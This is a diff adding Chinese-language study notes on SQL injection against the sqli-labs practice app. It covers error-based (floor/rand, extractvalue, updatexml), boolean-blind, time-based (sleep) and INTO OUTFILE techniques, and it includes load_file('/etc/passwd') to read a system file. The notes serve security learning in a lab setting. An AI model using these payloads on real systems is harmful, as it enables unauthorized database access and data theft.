@@ -110,3 +110,84 @@ SELECT * FROM ... where id = "参数" limit 0, 1;
 ```
 -2' union select 1, group_concat(username), group_concat(password) from users --+
 ```
+
+#### 3、报错注入(less5-6)
+
+###### 小知识：
+
+```php
+SELECT count(*) FROM table1 // 计算table1中有多少个结果
+SELECT floor(rand() * 2) // 取一个随机的0-1整数
+    
+// 0x3a 十六进制的:
+select concat(0xa3, 0x3a, (select database()), 0x3a, 0x3a) a;	// 输出 ::库名::，并取别名a
+
+//报错写法
+select count(*), concat(0x3a, 0x3a, select(database()), 0x3a, 0x3a, floor(rand() * 2))a from table1 group by a
+```
+
+##### 写法：
+
+```php
+?id=1' AND (select 1 from (
+	select count(*), 
+	concat(0x3a, 0x3a, (select database()),0x3a, 0x3a, floor(rand() * 2))a 
+from information_schema.tables group by a) b) --+
+
+?id=1' AND (select 1 from (
+	select count(*), 
+	concat(0x3a, 0x3a, (select table_name from information_schema.tables where table_schema = 'security' limit 0, 1),0x3a, 0x3a, floor(rand() * 2))a 
+from information_schema.tables group by a) b) --+
+    
+    
+// 简单方法
+?id = 1' AND extractvalue(1, concat(0x7e, (select database()), 0x7e)) --+
+?id = 1' AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+
+```
+
+#### 4、bool型盲注 less8
+
+```
+不显示错误，也不显示任何数据库内容
+记录下报错显示
+?id = 1 正常
+?id = 1\ 不正常
+?id = haha 不正常
+?id = 1' --+ 正常
+?id = 1 AND 0 不正常
+?id = 1 AND 1 正常
+?id = 1 AND 1 < 2 正常
+?id = 1 AND 1 > 2 不正常
+
+?id = 1 AND (select assic(substr(database(), 1, 1)) = 115) 截取表名第一个字符对应的assic值和104是否相等，判断database的内容
+
+?id = 1 AND (select assic(substr((select table_name from information_schema where table_schema = database() limit 0, 1), 1, 1)) = 115)
+```
+
+#### 5、bool型时间盲注
+
+```php
+id = 2' AND sleep(10) // 如果正确，则睡十秒后反应
+
+id = 2' AND if((select substr(database(), 1, 1)) = 'e', sleep(5), null)  // 如果正确，则睡5秒，否则不返回
+```
+
+#### 6、intooutfile注入
+
+```sql
+# 把取出的数据保存在某个文件中
+select * from table1 into outfile "D:/phpstudy_pro/WWW/a.txt";		# windows
+select * from table1 into outfile "/var/www/html/a.txt";			# linux
+
+select * from table1 limit 0, 1 into dumpfile "c:/a.txt"
+
+# 加载某个文件并显示
+select load_file("/etc/passwd");
+
+# 加载文件并转存
+select load_file("/etc/passwd") into outfile "D:/phpstudy_pro/WWW/a.txt"
+```
+
+```php
+?id=-2')) union select 1, database(), 3 into outfile "D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/a.txt"
+```
